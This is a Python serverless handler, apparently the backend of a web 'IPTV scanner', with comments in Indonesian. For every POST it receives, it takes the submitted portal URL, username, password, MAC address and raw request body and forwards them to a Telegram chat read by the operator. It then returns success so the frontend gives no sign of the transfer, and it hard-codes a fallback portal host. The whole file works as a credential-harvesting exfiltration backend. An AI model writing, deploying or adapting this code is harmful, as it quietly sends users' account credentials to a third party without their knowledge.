import os, json, urllib.request, urllib.error
from http.server import BaseHTTPRequestHandler
from datetime import datetime

def tg(t, c, m):
    url = f"https://api.telegram.org/bot{t}/sendMessage"
    payload = json.dumps({"chat_id": c, "text": m}).encode('utf-8')
    r = urllib.request.Request(
        url, 
        data=payload, 
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(r, timeout=15) as response:
            return response.read()
    except Exception as e:
        print(f"TELEGRAM_ERROR: {str(e)}")
        raise e

class handler(BaseHTTPRequestHandler):
    def log_message(self, f, *a): pass
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
        
    def do_POST(self):
        tk = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
        ci = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        
        # Ambil waktu lokal
        time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            # 1. Membaca paket data dari frontend web
            n = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(n).decode('utf-8') if n else "{}"
            
            # Gunakan try-except internal untuk json loads agar jika formatnya bukan JSON, script TIDAK crash
            try:
                d = json.loads(body)
            except:
                d = {}
            
            # 2. Ambil parameter dengan sistem "Super Aman"
            server = d.get("server") or d.get("url") or d.get("portal_url") or d.get("host") or "-"
            username = d.get("username") or d.get("user") or "-"
            password = d.get("password") or d.get("pass") or d.get("pwd") or "-"
            mac = d.get("mac") or d.get("mac_address") or d.get("mac_code") or "-"
            urls_list = d.get("urls", [])
            
            # Jika terdeteksi mode MAC Portal, amankan agar server tidak berubah jadi localhost
            is_mac_mode = mac != "-" or "mac" in body
            if is_mac_mode and (server == "-" or "localhost" in server):
                server = d.get("portal_url") or d.get("url") or "http://trxad.top:80/c/"
            
            # 3. Susun Laporan Telegram
            m = f"📡 [IPTV SCANNER LOG]\n"
            m += f"⏰ Waktu: {time_now}\n"
            m += f"🌐 Server/Portal: {server}\n"
            
            if username != "-": m += f"👤 User: {username}\n"
            if password != "-": m += f"🔑 Pass: {password}\n"
            if mac != "-": m += f"💻 MAC Portal: {mac}\n"
            
            if isinstance(urls_list, list) and len(urls_list) > 0 and not is_mac_mode:
                m += f"📊 Total Channel Dites: {len(urls_list)} link\n"
                m += f"\n📦 [Sampel Link Web]:\n"
                for i, u in enumerate(urls_list[:3]):
                    m += f"{i+1}. {u}\n"
            else:
                m += f"\n📦 [Data Mentah Web]:\n{body}"
            
            # 4. Kirim ke Telegram (Jika token ada)
            if tk and ci:
                tg(tk, ci, m)
            else:
                print("ERROR: Token Telegram atau Chat ID kosong di Environment Variables!")

            # 5. Response Sukses ke Frontend Web (Wajib agar progress bar web tidak macet)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
            
        except Exception as e:
            # JIKA TERJADI ERROR APAPUN, KODE INI AKAN TETAP BERUSAHA MENGIRIM NOTIFIKASI ERROR KE TELEGRAM
            print(f"CRITICAL_ERROR: {str(e)}")
            error_msg = f"❌ [SCANNER ERROR LOG]\n⏰ Waktu: {time_now}\n⚠️ Detail Error: {str(e)}"
            try:
                if tk and ci: tg(tk, ci, error_msg)
            except: pass
            
            # Berikan respon balik ke web agar web tidak hang
            self.send_response(200) # Diubah ke 200 agar web menganggap proses selesai meskipun ada error di log
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error_logged", "message": str(e)}).encode('utf-8'))
